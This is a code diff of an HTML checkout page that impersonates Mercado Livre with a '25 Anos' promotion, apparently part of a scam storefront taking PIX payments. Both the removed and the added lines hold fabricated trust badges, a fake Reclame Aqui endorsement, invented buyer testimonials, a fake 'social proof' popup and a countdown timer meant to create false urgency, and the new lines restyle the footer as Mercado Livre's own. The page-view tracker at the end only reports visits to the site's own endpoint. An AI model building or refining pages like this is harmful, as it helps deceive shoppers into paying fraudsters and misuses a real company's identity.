+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#00a650"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+          <span>Compra protegida</span>
         </div>
-        <div class="pt-item">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="#00a650"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-          <span>Seus dados estão criptografados</span>
-        </div>
-        <div class="pt-item">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="#00a650"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
-          <span>Garantia de reembolso em caso de problema</span>
-        </div>
-      </div>
-    </section>
-
-    <!-- ======== REVIEWS ======== -->
-    <section class="reviews-section">
-      <h3 class="reviews-title">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="#f5a623"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
-        O que dizem nossos compradores
-      </h3>
-
-      <div class="review-card">
-        <div class="reclame-aqui-card">
-          <img src="../images/reclameaqui.png" alt="Reclame Aqui">
-          <div class="ra-info">
-            <h4>Reclame Aqui</h4>
-            <p>Sua participação no evento de 25 Anos do Mercado Livre é totalmente confiável. A empresa do Mercado Livre age com 100% de transparência para garantir que você receba os produtos promocionais com a segurança de sempre. Finalize com tranquilidade!</p>
-            <div class="stars">&#9733;&#9733;&#9733;&#9733;&#9734;</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="review-card highlight-review">
-        <div class="review-badge">Pagou com PIX</div>
-        <div class="review-header">
-          <img src="../images/pessoa1.jpg" alt="Gabriel Freitas">
-          <div>
-            <h4>Gabriel Freitas</h4>
-            <div class="stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
-          </div>
-        </div>
-        <p>Eu jurava que era mentira pelo tamanho dos meus descontos e o preço inacreditável, mas quando comprei os produtos e eles realmente chegaram na minha casa fiquei sem acreditar, melhor promoção do mercado livre peguei o iphone 16</p>
-        <div class="review-pix-tag">
-          <svg width="12" height="12" viewBox="0 0 24 24" fill="#00a650"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-          Pagamento PIX confirmado em 10 segundos
-        </div>
-      </div>
-
-      <div class="review-card highlight-review">
-        <div class="review-badge">Pagou com PIX</div>
-        <div class="review-header">
-          <img src="../images/pessoa2.png" alt="Lu Sales">
-          <div>
-            <h4>Lu Sales</h4>
-            <div class="stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
-          </div>
-        </div>
-        <p>Maluco eu comprei pra presentear minha esposa mais tava com aquele medo de ser golpe mais tudo chegou certinho e bem rápido, agora tá eu e minha esposa pulando de felicidade aqui em casa kkkkkkkk</p>
-        <div class="review-pix-tag">
-          <svg width="12" height="12" viewBox="0 0 24 24" fill="#00a650"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-          Pagamento PIX confirmado em 15 segundos
+        <div class="trust-item-sm">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#00a650"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+          <span>Devolução grátis</span>
         </div>
       </div>
     </section>
 
     <!-- ======== FOOTER ======== -->
-    <footer class="checkout-footer">
-      <div class="footer-payment">
-        <span>Formas de pagamento</span>
-        <img
-          class="footer-payment-icon"
-          src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Pix_%28Brazil%29_logo.svg/3840px-Pix_%28Brazil%29_logo.svg.png"
-          alt="Logo Pix"
-        />
-      </div>
-      <p>&copy; 2026 Compra Segura</p>
-      <div class="secure-footer">
-        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-        Ambiente 100% seguro
+    <footer class="ml-footer">
+      <div class="ml-footer-inner">
+        <span>Mercado Livre &copy; 2026</span>
+        <span class="ml-footer-sep">&middot;</span>
+        <span>Pagamento seguro</span>
       </div>
     </footer>
 
-  </div><!-- .checkout-main -->
+  </main>
 
   <!-- ======== SOCIAL PROOF POPUP ======== -->
   <div class="social-proof" id="social-proof">
     <img src="../images/carloshenrique.jpeg" alt="">
-    <div class="sp-content">
+    <div class="sp-body">
       <p></p>
       <span class="sp-time">agora mesmo</span>
     </div>
+    <button class="sp-close" onclick="this.parentElement.classList.remove('show')">&times;</button>
   </div>
 
   <!-- ======== STICKY TIMER ======== -->
   <div class="sticky-timer" id="sticky-timer">
-    <div class="sticky-timer-left">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
-      <span>Oferta expira em:</span>
-    </div>
-    <div class="timer-digits">
-      <div class="timer-unit">
-        <span class="timer-num" id="timer-hours">00</span>
-        <span class="timer-label">Horas</span>
-      </div>
-      <span class="timer-sep">:</span>
-      <div class="timer-unit">
-        <span class="timer-num" id="timer-mins">05</span>
-        <span class="timer-label">Min</span>
-      </div>
-      <span class="timer-sep">:</span>
-      <div class="timer-unit">
-        <span class="timer-num" id="timer-secs">30</span>
-        <span class="timer-label">Seg</span>
+    <div class="sticky-timer-inner">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="#333"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+      <span>Oferta expira em</span>
+      <div class="timer-nums">
+        <b id="timer-hours">00</b>:<b id="timer-mins">05</b>:<b id="timer-secs">30</b>
       </div>
     </div>
   </div>
@@ -515,20 +406,20 @@
   <script src="../js/cart.js"></script>
   <script src="js/checkout.js"></script>
 
-<!-- Page View Tracker -->
-<script>
-(function(){
-  var p = encodeURIComponent(location.pathname);
-  var r = encodeURIComponent(document.referrer);
-  var params = new URLSearchParams(location.search);
-  var qs = 'page=' + p + '&ref=' + r;
-  ['utm_source','utm_medium','utm_campaign','utm_content','utm_term'].forEach(function(k){
-    var v = params.get(k);
-    if(v) qs += '&' + k + '=' + encodeURIComponent(v);
-  });
-  var img = new Image();
-  img.src = '/api/track.php?' + qs;
-})();
-</script>
+  <!-- Page View Tracker -->
+  <script>
+  (function(){
+    var p = encodeURIComponent(location.pathname);
+    var r = encodeURIComponent(document.referrer);
+    var params = new URLSearchParams(location.search);
+    var qs = 'page=' + p + '&ref=' + r;
+    ['utm_source','utm_medium','utm_campaign','utm_content','utm_term'].forEach(function(k){
+      var v = params.get(k);
+      if(v) qs += '&' + k + '=' + encodeURIComponent(v);
+    });
+    var img = new Image();
+    img.src = '/api/track.php?' + qs;
+  })();
+  </script>
 </body>
 </html>
